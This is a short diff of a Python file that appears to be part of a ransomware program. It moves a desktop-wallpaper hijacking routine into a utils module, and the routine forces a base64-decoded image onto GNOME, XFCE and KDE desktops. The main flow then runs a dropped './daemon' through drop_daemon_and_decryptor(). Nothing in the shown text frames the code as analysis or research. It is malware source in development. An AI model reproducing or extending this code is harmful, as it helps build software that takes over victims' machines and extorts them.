@@ -145,37 +145,10 @@ def drop_daemon_and_decryptor():
     os.system('./daemon')
 
 
-def change_wallpaper():
-    with open(variables.img_path, 'wb') as f:
-        f.write(base64.b64decode(variables.img))
-    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
-            .format(variables.img_path)
-    
-    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" ''' \
-            .format(variables.img_path)
-    
-    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"' \
-            .format(variables.img_path)
 
-    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
-var Desktops = desktops();                                                                                                                       
-for (i=0;i<Desktops.length;i++) {
-        d = Desktops[i];
-        d.wallpaperPlugin = "org.kde.image";
-        d.currentConfigGroup = Array("Wallpaper",
-                                    "org.kde.image",
-                                    "General");
-        d.writeConfig("Image", "file://%s");
-}'
-""" %(variables.img_path)
-
-    os.system(gnome)
-    os.system(xfce)
-    os.system(xfce1)
-    os.system(kde)
 
 
 if __name__ == "__main__":
     menu()
-    change_wallpaper()
+    utils.change_wallpaper()
     drop_daemon_and_decryptor()
